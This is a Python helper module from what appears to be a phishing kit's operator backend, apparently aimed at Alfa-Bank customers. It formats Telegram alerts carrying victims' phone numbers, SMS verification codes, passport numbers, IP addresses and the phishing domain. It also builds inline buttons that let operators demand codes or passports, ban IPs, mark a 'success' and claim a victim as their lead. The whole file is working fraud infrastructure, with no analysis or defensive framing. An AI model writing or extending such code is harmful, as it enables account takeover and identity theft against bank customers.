from asgiref.sync import sync_to_async
from web_site.helpers import *
from bot.models import TelegramBot, ProcessedLead
from telegram import InlineKeyboardMarkup, InlineKeyboardButton


class BotHelper:
    def __init__(self, lead_id):
        self.lead_id = lead_id

    async def get_lead(self):
        return await ProcessedLead.objects.filter(lead_id=self.lead_id).afirst()

    async def get_bot(self):
        bot = await TelegramBot.objects.all().afirst()

        return bot

    async def phone_message(self, request, user_id: int, phone: str, ip):
        lead = await self.get_lead()

        message = f"Статус: [Альфа NEW - Новый лог]\n" \
                  f"Номер телефона: {phone}\n" \
                  f"IP: {ip}\n" \
                  f"ID: {user_id}\n" \
                  f"Домен: {request.META['HTTP_HOST']}\n\n"

        if lead:
            message += f"ℹВзяв {lead.lead_owner}"

        return message

    async def sms_message(self, request, user_id: int, code: int, ip):
        lead = await self.get_lead()

        message = f"Статус: [CODE]\n" \
                  f"CODE: {code}\n" \
                  f"IP: {ip}\n" \
                  f"ID: {user_id}\n" \
                  f"Домен: {request.META['HTTP_HOST']}\n\n"

        if lead:
            message += f"ℹВзяв {lead.lead_owner}"

        return message

    async def passport_message(self, request, user_id: int, passport: int, ip, phone):
        lead = await self.get_lead()

        message = f"Статус: [Пасспорт получен]\n" \
                  f"Passport: {passport}\n" \
                  f"Phone: {phone}\n" \
                  f"IP: {ip}\n" \
                  f"ID: {user_id}\n" \
                  f"Домен: {request.META['HTTP_HOST']}\n\n"

        if lead:
            message += f"ℹВзяв {lead.lead_owner}"

        return message

    def keyboard(self, request, user_id: int, ip, is_taken: bool = False) -> InlineKeyboardMarkup:
        buttons = [
            [
                InlineKeyboardButton("Пасспорт", callback_data=f'passport_{user_id}'),
                InlineKeyboardButton("SMS код", callback_data=f'sms_{user_id}')
            ],
            [
                InlineKeyboardButton("IP ban", callback_data=f'ban_{user_id}_{ip}')
            ],
            [
                InlineKeyboardButton("Успех", callback_data=f'success_{user_id}')
            ]
        ]

        if not is_taken:
            buttons.append([InlineKeyboardButton("Беру", callback_data=f'take_{user_id}')])

        return InlineKeyboardMarkup(buttons)
